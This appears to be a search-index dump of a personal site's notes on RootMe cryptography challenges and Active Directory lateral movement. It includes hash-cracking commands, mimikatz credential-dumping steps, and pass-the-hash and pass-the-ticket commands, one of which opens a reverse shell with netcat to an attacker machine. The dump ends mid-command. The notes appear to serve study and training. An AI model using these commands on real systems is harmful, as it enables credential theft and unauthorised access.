    "c": "RSA Continued fractions  RootMe Challenge: Private key : You have to login via ssh with an rsa-key authentication. Public key: E = 0xf70b3bd74801a25eccbde24e01b077677e298391d4197b099a6f961244f04314da7de144dd69a8aa84686bf4ddbd14a6344bbc315218dbbaf29490a44e42e5c4a2a4e76b8101a5ca82351c07b4cfd4e08038c8d5573a827b227bce515b70866724718ec2ac03359614cdf43dd88f1ac7ee453917975a13c019e620e531207692224009c75eaef11e130f8e54cce31e86c84e9366219ae5c250853be145ea87dcf37aa7ece0a994195885e31ebcd8fe742df1cd1370c95b6684ab6c37e84762193c27dd34c3cf3f5e69957b8338f9143a0052c9381d9e2ecb9ef504c954b453f57632705ed44b28a4b5cbe61368e485da6af2dfc901e45868cdd5006913f338a3 N = 0x0207a7df9d173f5969ad16dc318496b36be39fe581207e6ea318d3bfbe22c8b485600ba9811a78decc6d5aab79a1c2c491eb6d4f39820657b6686391b85474172ae504f48f02f7ee3a2ab31fce1cf9c22f40e919965c7f67a8acbfa11ee4e7e2f3217bc9a054587500424d0806c0e759081651f6e406a9a642de6e8e131cb644a12e46573bd8246dc5e067d2a4f176fef6eec445bfa9db888a35257376e67109faabe39b0cf8afe2ca123da8314d09f2404922fc4116d682a4bdaeecb73f59c49db7fa12a7fc5c981454925c94e0b5472e02d924dad62c260066e07c7d3b1089d5475c2c066b7f94553c75e856e3a2a773c6c24d5ba64055eb8fea3e57b06b04a3 Use continued fractions to calculate the private key, put it in a private ssh identity file, chmod it to 600 and log in: $ ssh -i .ssh/id_rsa -p 2221 cryptanalyse-ch24-cracked@challenge01.root-me.org Warning: Identity file .ssh/id_rsa not accessible: No such file or directory. _ _ _ ___ _ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\/ | / __| '_ \\ / _` | | |/ _ \\ '_ \\ / _` |/ _ \\ | | | | | (__| | | | (_| | | | __/ | | | (_| | __/ |_| | | \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/|_| |___/ root-me.org ██▒ ▒██░ ░███░ █ █ ░███▒ ░███░ ▓ ███░ ▓█▓ ▓█░ ▓ ▓███ ██▒ ░▓█▓███ ▓ ██ █▒ ░██ ██ ███ ▒░ ▓░████░██ ▓█░ ██ ▒██ ███ ░▓██ ▒█ ██ ░█░ ░██ ▓█ ░█████████████ █ ██░ █▓ ██ █ ░██ ██ ██ ░ ░██▓ ██ ██ ███ ░██▓░███ ███ ▒█ ▓██▓ ░████ █▓ ░████ ░██ ▒█ ▓█████░ ███ ███▓ ▓███ █████░ ████ ▓█ ░██▓░ ▒████████░ ██ ▓█ ██░▒██████████████████░ ██ ▓█ ███▓██▒ ░██████████░ ██ ▓█ ░████▒ ██ ░██▓ ▒█▓ ▒██░ ▒██░ ██ ▒█ ██▓ █▒ █ █▒ ░█ █░ █▓ █ █████████████████████ ████████████▄ ██ ███ ███ ██ ██ ▄████████▄ ▄████████▄ ██████ ████ ████ ▄████████▄ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████▀ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████ ██ ███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ▀████████▀ ▀████████▀ ██ ██ █ ██ ▀██████████ ------------------------------------------------------------------------------------------------ Welcome on challenge01 / -----------------------------‘ /tmp and /var/tmp are writeable Useful commands available: python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, ROPgadget, radare2, pwntools Attention: Publishing solutions publicly (blog, github, youtube, etc.) is forbidden. Publier des solutions publiquement (blog, github, youtube, etc.) est interdit. cryptanalyse-ch24-cracked@challenge01:~$ ls flag cryptanalyse-ch24-cracked@challenge01:~$ cat flag Resources  Continued Fractions - RSA Fractions Continues et Algorithme LLL - RSA",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "45a001e22604bc1d4cc80032ce1fc550",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/corrupted-key3",
    "t": "RSA Corrupted key 3 ",
    "c": "RSA Corrupted key 3  RootMe Challenge: So little and yet so much : We’re going to need your help again to decipher this message. This sly hacker is once again taunting us by giving us the decryption key! Well, part of it at least… Resources  ASN1 key structures in DER and PEM - tls.mbed.org",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bfbce41afc944b66ec29b3d7a31fe189",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/corrupted-key2",
    "t": "RSA Corrupted key 2 ",
    "c": "RSA Corrupted key 2  RootMe Challenge: Even with less, you can do it! : One more time, we need you to recover important information. We hope you will be able do retrieve it using this data. Get the plain text. Resources  New Partial Key Exposure Attacks on RSA - Johannes Blomer - Alexander May Partial Key Exposure AttackOn Low-Exponent RSA - Eric W Everstine Twenty Years of Attacks on the RSA Cryptosystem - Dan Boneh",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4e4f0c4b654cd46d69ddc6afc733b44d",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/multiple-recipients",
    "t": "RSA Multiple recipients ",
    "c": "RSA Multiple recipients  RootMe Challenge: Chinese! : A message sent to 3 different people has been intercepted. We have the public keys of those people. Find the message to validate the challenge. Resources  New Partial Key Exposure Attacks on RSA - Johannes Blomer - Alexander May Partial Key Exposure AttackOn Low-Exponent RSA - Eric W Everstine Cryptanalyse de RSA Twenty Years of Attacks on the RSA Cryptosystem - Dan Boneh Cryptanalysis of short RSA secret exponents",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cd4e6aba32399643885ea26467a989e6",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ecc/ecdsa-conventional",
    "t": "ECDSA: Conventional attack ",
    "c": "ECDSA: Conventional attack  RootMe Challenge: Conventional attack on ECDSA : You are provided with 30 messages to break our ECDSA cipher. Each message has been signed with our private key. Get the flag by faking a signature. Retrieve the necessary files using SSH then validate the challenge by sending your signed message to the provided network service. Elliptic curve digital signature algorithm  ECDSA, an elliptic curve variant of DSA that was invented only to circumvent patents in Schnorr signatures. The signature scheme is specified in many standards including ISO 14888-3, ANSI X9.62, NIST’s FIPS 186-2, IEEE P1363, and so on. Not all standards are compatible, and applications that want to interoperate have to make sure that they use the same standard. As with all such schemes, the public key is pretty much always generated according to the same formula: The private key is a large number x generated randomly. The public key is obtained by viewing \\(x\\) as an index in a group created by a generator (called base point in elliptic curve cryptography). To compute an ECDSA signature, you need the same inputs required by a Schnorr signature: a hash of the message you’re signing \\((H(m))\\) , your private key \\(x\\) , and a random number \\(k\\) that is unique per signature. \\(k\\) must never be repeated nor be predictable! Without that, it is trivial to recover the private key. Even more subtle, if the nonce \\(k\\) is not picked uniformly and at random (specifically, if you can predict the first few bits), there still exist powerful attacks that can recover the private key in no time (so-called lattice attacks). In theory, these kinds of key retrieval attacks are called total breaks (because they break everything!). They are quite rare in practice, which makes ECDSA an algorithm that can fail in spectacular ways. Resources  Elliptic_Curve_Digital_Signature_Algorithm NIST.FIPS.186-4 Digital Signature Standard Practical cryptography for developers: ECDSA: Elliptic Curve Signatures",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3a3583541a41068f712efde3e616f916",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/pmac",
    "t": "AES PMAC forgery attack ",
    "c": "AES PMAC forgery attack  RootMe Challenge: Forgery attack against an efficient AES-PMAC implementation : You found this binary which performs some cryptographic operations. Can you extract the validation password from it? Resources  Intel Advanced Encryption Standard (AES) New Instructions Set - Shay Gueron A Block-Cipher Mode of Operation for Parallelizable Message Authentication - Black and Rogaway",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2bf9479087a48bfc4251df4f219c11c2",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ciphers/gedefu",
    "t": "GEDEFU ",
    "c": "GEDEFU  RootMe challenge : June 2, 1918, he decrypts an important message to win the First World War. 1962, this strange morse message was revealed. Uncipher this message in order to understand how the Allies won the first World War. The password is in UPPERCASE. Ciphertext: The morse code translates to: GDGDAGFXXDVGAGXGXFGXGFVGVAXDVXAFAGXVGDDVVAAFAVGGAGGAXVDGDAAXAXGGAXAFAGFFAGFXAGDXGAFVGGGGAXXGDXDAAFDDFGAXADFGGXGFAXDXAVXVDXGXXDAXGGGFGFGDGGFGAXFFVGGFFXXGXGGXXXAVXXAFVFVGGGVDGDFFAXGDXGAXGGAVAAAFGFGFDXGVGFDFGXDFXGGGAFXDAXGGVFAVFFAGAXGXGFXXAGVDFFGXGXAGGDFFXAGXGVFFXAADXVAGXGAVVAAAGXAADGVXGXAAAFGAXFGFGXXFAVGVAGGGVXGGGXAFDVGGADXFAGGXAXGDGXGADFVGDFGVVDGXDVAFAXGDADDXDFDFXXGXGFFGVXVVVAAFDDGXGFGAGFXDGFFFXDVAAVFXAFGGXDFXGDDXVXGXAXXGGVVAGXGGFVAGXXAGAAAFAFGFAGGGAXVGAVGGAFXGXXAGGXDAAXADDXDGGVGXXVAAADDAXFXFGGGGGFAVAVXFADDGDFAXAVAVXGAVXFAXGGADXVDVVVAGAFGVDAGFXFAXFDXVAFGGAXXXAXAFAGAFFGGXDXAVAGDGXAGDXXXDFGDGXXVAAVAXVXGFAGGVAVAFAFGFAGADGFFADDDVDGGADFADGXFFDFGXGXAGXGGFFXXFAVAVGAADAGAXGXAAAGGVGFXGAFAXVXAXAADFDVAFDGXFXGDXADDAGGAVAXAGAFXDXFGXGGVGFAADXXXGXGGFGDAGGVAGGGVFAAAVGGGXGXXXAGDXGGAFAXAVAVGGGGAXGGGVFXGXVGGXGFXADXAGGXFGXFAGFXAXXXAFAVGVDFAFGFAGGFXGFADVGXGAGFVFGXADXFGFGXAGADGXADDXGFXDXVGGAGVXXGAXGFFVDVAXXXAXXXDFAFAXADXGDAAVAGFFDXXVGFGGVVXFXXAGXGGDVVDXVDGXGADGGFXFDXAVDFGFGGVAXFGFGXXVFXVGGXGAFVGGXFGGFXFGFAFXGGDFGGXGFAGGFDXAXAAAXXDAXXFAXGXGVGFGXAXAXGFGGGGGFFFDVAVXXDGAAAGAGAXAFAGXDGVDXADXGFGFFDGXDDGAXGVFGDGDFFFXXVAAFDVGFDVXADAAFVGAXADAGVXFXXGFGVXGFVVGFAVFGFVXVGDXVXXDXGFXVGFDAADDGAXAXGFVFGGXXGXXGVDXGXXVXXDGGGFAGXDGFFVAVAGGXAVFVXFVGAGADGXVDDXVGDFADGFFGDXAFAXXFGGGGVDFXAGAXDGGGAXVXAAAXVXGFXFFXAXGXAVGGGFDVGVXVFDFVAAADGFFXGGVXAGDFGGAFVXGGXXXGFXAXAXGXAGVGDFAXDFXGGGDXAFDGGVVFXAADDXAAXGGAAXDXVXAVGGGXFXXAGGGFFFXXVVFVAFAVGGFGAXAGADFXADDFXAGXXXXGDXXFAFFGXGGGAXFGAFXDGXAGFGAAFFGXFAGFAAGVAGFGXXAXAGDGVVDXGFVXXXAXAGXGFDXGGDGDAXXDFFGFAGGVGGXFAGXGDDDDGGDFGDAFXAAXAVXFAGAXAGAAXFGVXFFXDXDGGXGXXFAXFXXDGFXGVXDGGGGXGGXGAFVGFGXGGDAGDFXGAAXXAGAGGFAXXXFGAXFFXAAAXGVFVGDVXXGFAAVGXVXAVFVGFAFAGAFGXFFXVGFGVGVFFAAXFFDDXDDAAAGADAFDFVVGDXGAFDXDXAVGGVDDFXVAGGXAFAVXFXGXFVGXFGFGVGXDGXVAFGXAGFGAXVFXFVGDGFFAVVVAFGXAVXFXVAFGAAAAGVXADAVDXVFAFGXVFGXDXAVGDAGAGXDXFXGAXDGGXAXGXGXGFGDGAAXGGGXGXXDGXAFFVXGAGGDVFGFXXXVGVAXDXVGGFFAFXADXFFFAGAXAXGFAGGAADDXAXFXFVAFXXVVAXFXFVFFGAFGGXVXVGAXGXDGGFXXVFFFFVVAXFFAXVFAAFFADAXVFGXVXAVXAGFAGAFGDVGAVGFADGVGXGGAXGFAXGXAFXDDFFVFGXGFXXAGVGVAFDVXFAFDGVXGFAGGDGFFFDXXXGXADDVGFXGVFGXAXXXAXAXAXGFAXXXAGVDAADXXDGFFVGVGFDGDVGFXGDFAFAFFFDXAVGXXXGXGDGFXGGVAXADDXAFADAXDVFDAGADVAAXVDGGGVGXFVADFXGAAFXXADXGGGXFFGAXGVVFGXAXGAAXDGFFGFAVFFAVGFADXGFFDGGFGVFFGGVDXFAXXDVGADAVXFXFAVAXAGXGFVGDGXAX Aha! An ADFGX Cipher , a two-stage cipher, polybius-square substitution followed by columnar transposition. Resources  Morsecoder General solution for the ADFGVX cipher system - NSA - declassified",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ea46a9c2c32b31b30dc34c7b9d92c87d",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/data/pkzip",
    "t": "Protected PKZIP file ",
    "c": "Protected PKZIP file  RootMe: File - PKZIP : A protected ZIP file, you have to find what’s inside. PKZIP  PKZIP encryption has been around since 1990, and its decryption is directly supported in most desktop environments (Windows, macOS, most Linux distros). This makes it one of very few options when recipients are not allowed to run any unknown program, and the most likely to allow smooth decryption by an unspecified legitimate receiver holding the password. Even with a high-entropy password it can be very vulnerable when: An adversary knows the start (sometime even part of) any file bundled in the archive. The archive contains many files. The archive was prepared with a tool using a poor entropy source, as many are. In general, enough redundancy in the plaintext can allow a practical ciphertext-only attack for a poor cipher; and allows key enumeration for almost any cipher. Note, “there’s almost no way to get it right unless you have the beginning of the file.” Solution  Download the file using wget and use fcrackzip fcrackzip -c 1 -l 2-17 -u ch5.zip Resources  Cracking PKZIP file’s password",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "302611fe2b60e400411d1d22646be59a",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ciphers/caesar",
    "t": "Mono-alphabetic substitution: Caesar ",
    "c": "Mono-alphabetic substitution: Caesar  RootMe Challenge: Monoalphabetic substitution - Caesar : We just caught the messenger of the Emperor. He transmitted a coded message to his son. This could be an important message. You’ve to decrypt it ! To validate, you must enter the concatenation of the first letters of each line followed by the concatenation of the last letters of each line (for example : tfhqdlhfpkmeokgq ). I used Hack Caesar 26 and a pattern and poem emerged. Resources  Le code de César Le chiffrement par décalage",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "afd29e31d2c975818ca14669a4369094",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/lm",
    "t": "LM Hash ",
    "c": "LM Hash  The LM hash is a very weak one-way function used for storing passwords. Originally invented for the LAN Manager operating system, the LM hash was included in Windows NT for backward compatibility. It is still included for backward compatibility. Because of the way the LM hash is calculated, no password with an LM hash is stronger than a 7-character password selected from a 142-character character set. The LM hash is always disabled on newer versions of Windows. Retrieve the password of the Administrator user from the information output by the secretsdump tool of the Impacket suite . [*] Target system bootKey: 0xf1527e4742bbac097f937cc4ac8508e4 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:d3bf255c530633b9aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ASPNET:1025:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DBAdmin:1028:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: sshd:1037:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: service_user:1038:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) ROOTME.LOCAL/PODALIRIUS:$DCC2$10240#PODALIRIUS#9d3e8dbe4d9816fa1a5dda431ef2f6f1 ROOTME.LOCAL/SHUTDOWN:$DCC2$10240#SHUTDOWN#9d3e8dbe4d9816fa1a5dda431ef2f6f1 [*] Dumping LSA Secrets [*] $MACHINE.ACC ROOTME\\PC01$:aes256-cts-hmac-sha1-96:e6d5ab8e29fb4f648490fb1cb099b64dffbd2b9e77d46b8df41bc482d590bfe3 ROOTME\\PC01$:aes128-cts-hmac-sha1-96:971589d11f2a62980fcab210fa442f4a ROOTME\\PC01$:des-cbc-md5:f18f6dfb6b197fe9 ROOTME\\PC01$:plain_password_hex:a918646aa8406975d5ed97534946ef780d48075e618e309b30bf5c9f ROOTME\\PC01$:88c2213866d15f645295e3ebc8779879:ba380afe874fbc0d99b16f8188968133::: [*] DPAPI_SYSTEM dpapi_machinekey:0xf35c35eddeecd7b0da287db2e4f8b89b96387157 dpapi_userkey:0x04b4fb8214fb142f86ca2c34de1866f7e565f6f1 [*] NL$KM 0000 E4 7B 83 10 D7 9D A9 FE C5 B7 F9 CB 81 27 2A 13 .{...........'*. 0010 9B 61 D1 F2 9C 0B 1C 8C 53 55 42 46 02 51 10 AC .A......SUBF.Q.. 0020 4C 02 88 83 CF 37 C8 0C D3 16 71 96 9E 0E B5 46 L....7....Q....F 0030 C5 A4 D0 26 8A 77 40 85 B2 E6 1A 8D CF CB A3 46 ...&.W@........F NL$KM:e47b8310d79da9fec5b7f9cb81272a139b61d1f29c0b1c8c53554246025110ac4c028883cf37c80cd31671969e0eb546c5a4d0268a774085b2e61a8dcfcba346 [*] _SC_sos_scheduler_scibeta ELITE\\CHOUPAPI:Mdp!1256@ [*] _SC_sshd service_user:Mdp!1256@ [*] Cleaning up... In Administrator:500:d3bf255c530633b9aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: , the 500 is a relative identifier ( 500 is an administrator), d3bf255c530633b9aad3b435b51404ee is the LM hash, and 31d6cfe0d16ae931b73c59d7e0c089c0 is the NTLM (or NT for short) hash. Use john : john --format=lm hash.txt Use hashcat : hashcat -m 3000 -a 3 hash.txt Or, if you wish to save yourself and your machine cycles, use the crackstation .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "72739b56568f72495b6108d96be7c657",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ecc/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  ECC is more powerful and efficient than alternatives like RSA and classical Diffie–Hellman (ECC with a 256-bit key is stronger than RSA with a 4096-bit key), and it is also more complex. Why?  This topic is filled with fiddly parameters, subtle pitfalls, and breathtaking logic. The beauty of which I have to explore and exerience. How?  Discrete logarithm problem ECDHE ECDSA: Conventional attack ECDSA: Implementation error",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "63679a48cd9621539cdd581983bbe75f",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/iv",
    "t": "Initialisation vector ",
    "c": "Initialisation vector  RootMe challenge : The Initialisation Vector has been lost, we unfortunately just found a ciphertext. It’s up to you to find this lost IV using this information. The text was encrypted using AES-256 CBC, and the padding used is PKCS#7 standard. The validation password is the initial vector (ASCII). Plaintext: Marvin: \"I am at a rough estimate thirty billion times more intelligent than you. Let me give you an example. Think of a number, any number.\" Zem: \"Er, five.\" Marvin: \"Wrong. You see?\" Ciphertext: cY1Y1VPXbhUqzYLIOVR0RhUXD5l+dmymBfr1vIKlyqD8KqHUUp2I3dhFXgASdGWzRhOdTj8WWFTJ PK0k/GDEVUBDCk1MiB8rCmTZluVHImczlOXEwJSUEgwDHA6AbiCwyAU58e9j9QbN+HwEm1TPKHQ6 JrIOpdFWoYjS+cUCZfo/85Lqi26Gj7JJxCDF8PrBp/EtHLmmTmaAVWS0ID2cJpdmNDl54N7tg5TF TrdtcIplc1tDvoCLFPEomNa5booC Key: AQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRqrHB0eHyA= Decrypt the ciphertext with a NULL IV to find a string that does not appear in the original plaintext (the first 16 characters): 0x3e04461e5d1f6365305015507f5d5d5b XOR the first block (16 characters) of the deciphered ciphertext, with the actual plaintext.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3d6c54cde8aa79237277be66e42e47ce",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/padding",
    "t": "RSA Padding ",
    "c": "RSA Padding  RootMe Challenge: PKCS#1 v1.5 - DROWN : Decrypt the message in flag.txt by using this network decrypt/encrypt service. Get the needed files with the SSH access. You can also connect to the service from localhost. Resources  The 9 Lives of Bleichenbacher’s CAT - Ronen,Gillham,Genkin,Shamir,Wong,Yarom DROWN: Breaking TLS using SSLv2 Chosen ciphertext attacks against protocols based on the RSA encryption standard - Daniel Bleichenbacher",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2a2f2d13c384b25c73eddd9139527069",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/nt",
    "t": "NT Hash ",
    "c": "NT Hash  This is the way passwords are stored on modern Windows systems. They can be obtained by dumping the SAM database, or using Mimikatz. They are also stored on domain controllers in the NTDS file. These are the hashes that can be used to pass-the-hash . Retrieve the password of the Administrator user from the information output by the secretsdump tool of the Impacket suite . [*] Target system bootKey: 0xf1527e4742bbac097f937cc4ac8508e4 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:b4f79698831d92b61f886438e36c0c52::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ASPNET:1025:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DBAdmin:1028:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: sshd:1037:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: service_user:1038:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) ROOTME.LOCAL/PODALIRIUS:$DCC2$10240#PODALIRIUS#9d3e8dbe4d9816fa1a5dda431ef2f6f1 ROOTME.LOCAL/SHUTDOWN:$DCC2$10240#SHUTDOWN#9d3e8dbe4d9816fa1a5dda431ef2f6f1 [*] Dumping LSA Secrets [*] $MACHINE.ACC ROOTME\\PC01$:aes256-cts-hmac-sha1-96:e6d5ab8e29fb4f648490fb1cb099b64dffbd2b9e77d46b8df41bc482d590bfe3 ROOTME\\PC01$:aes128-cts-hmac-sha1-96:971589d11f2a62980fcab210fa442f4a ROOTME\\PC01$:des-cbc-md5:f18f6dfb6b197fe9 ROOTME\\PC01$:plain_password_hex:a918646aa8406975d5ed97534946ef780d48075e618e309b30bf5c9f ROOTME\\PC01$:88c2213866d15f645295e3ebc8779879:ba380afe874fbc0d99b16f8188968133::: [*] DPAPI_SYSTEM dpapi_machinekey:0xf35c35eddeecd7b0da287db2e4f8b89b96387157 dpapi_userkey:0x04b4fb8214fb142f86ca2c34de1866f7e565f6f1 [*] NL$KM 0000 E4 7B 83 10 D7 9D A9 FE C5 B7 F9 CB 81 27 2A 13 .{...........'*. 0010 9B 61 D1 F2 9C 0B 1C 8C 53 55 42 46 02 51 10 AC .A......SUBF.Q.. 0020 4C 02 88 83 CF 37 C8 0C D3 16 71 96 9E 0E B5 46 L....7....Q....F 0030 C5 A4 D0 26 8A 77 40 85 B2 E6 1A 8D CF CB A3 46 ...&.W@........F NL$KM:e47b8310d79da9fec5b7f9cb81272a139b61d1f29c0b1c8c53554246025110ac4c028883cf37c80cd31671969e0eb546c5a4d0268a774085b2e61a8dcfcba346 [*] _SC_sos_scheduler_scibeta ELITE\\CHOUPAPI:Mdp!1256@ [*] _SC_sshd service_user:Mdp!1256@ [*] Cleaning up... Crack b4f79698831d92b61f886438e36c0c52 with john or hashcat : john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt Or use hashes.com .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d9a42da30c1dfc53232a8b7fc1efd49c",
    "u": "https://ad.tymyrddin.dev/docs/pivot/auth.html",
    "t": "Use of alternate authentication material ",
    "c": "Use of alternate authentication material  NTLM authentication flow  This is for domain authentication. In local authentication, this process only occurs between the client and server, as the server keeps the user's NTLM hash in the SAM If an attacker manages to compromise a machine where a domain user is logged in, the attacker may be able to dump the domain user’s NTLM hash from memory by using a tool like mimikatz or other methods. The attacker could try to crack the hash(es) and user passwords. User sends hash (not password). This allows an attacker to authenticate as a user in certain situations without ever needing to know a password, called pass-the-hash . It does require dumping hashes locally or remotely. Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Cracking hashes  As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords, or hashes that can be easily cracked. NTLM hash (NTHash)  These hashes can be obtained by dumping the SAM database or using mimikatz . They are also stored on domain controllers in the NTDS file. These are the hashes that can be used to pass-the-hash . Usually people call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). Example: B4B9B02E6F09A9BD760F388B67351E2B The algorithm: MD4(UTF-16-LE(password)) UTF-16-LE is the little endian UTF-16 . Windows used this instead of the standard big endian. Cracking: john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt NTLMv1 (Net-NTLMv1) hash  The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and on what is available. A way of obtaining a response to crack from a client, responder can be used. The value to crack would be the K1 | K2 | K3 . Version 1 is deprecated, but might still be used in some old systems on the network. Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c The algorithm: C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C) Cracking: john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt NTLMv2 (Net-NTLMv2) hash  The new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, but a different algorithm and responses are sent to the server. Can also be captured with responder . This is the Default in Windows since Windows 2000. Example: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 The algorithm: SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC* Cracking: john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Pass-the-hash  The NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can pass-the-hash (PtH) for authentication. Assuming NTLMv2, To extract NTLM hashes, use mimikatz to read the local SAM or extract hashes directly from LSASS memory. Extracting NTLM hashes from local SAM will only allow getting hashes from local users on the machine. No domain user hashes will be available. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam Extracting NTLM hashes from LSASS memory will give any NTLM hashes for local users and any domain user that has recently logged onto the machine. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv The extracted hashes can be used in a PtH attack by using mimikatz to inject an access token for the target user on a reverse shell (or any other command): mimikatz # token::revert mimikatz # sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5555\" token::revert reestablishes the original token privileges, because trying to pass-the-hash with an elevated token will not work. Run a reverse listener on the attack machine: nc -lnvp 5555 Running the whoami command on this shell, it will still show the original user from before doing the PtH, but any command run from here will use the credentials thet were injected. Some Linux tools have built-in support for PtH attacks using different protocols. Depending on which services are available, try: Connect to RDP using PtH: xfreerdp /v:<IP target> /u:<domainname>\\\\<username> /pth:<ntlmhash> Connect via psexec using PtH: psexec.py -hashes <ntlmhash> <domainname>/<username>@<IP target> Note: Only the linux version of psexec supports PtH. Connect to WinRM using PtH: evil-winrm -i <IP target> -u <username> -H <ntlmhash> Pass-the-ticket  It may be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz . This usually requires having SYSTEM privileges on the attacked machine: mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export Extracting TGTs will require administrator privileges, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account). We need the ticket and its corresponding session key. Inject the ticket into the current session: mimikatz # kerberos::ptt <ticket> Where ticket looks something like: [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi Injecting tickets in our own session does not require administrator privileges. After this, the tickets will be available for any tools used for lateral movement. To check if the tickets were correctly injected, exit out of the mimikatz session and: za\\user.name@THMJMP2 C:\\> klist Overpass-the-hash/Pass-the-key  This attack is similar to PtH but then for Kerberos networks. Obtain the Kerberos encryption keys from memory with mimikatz: mimikatz # privilege::debug mimikatz # sekurlsa::ekeys Get a reverse shell. Depending on the available keys: RC4: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com 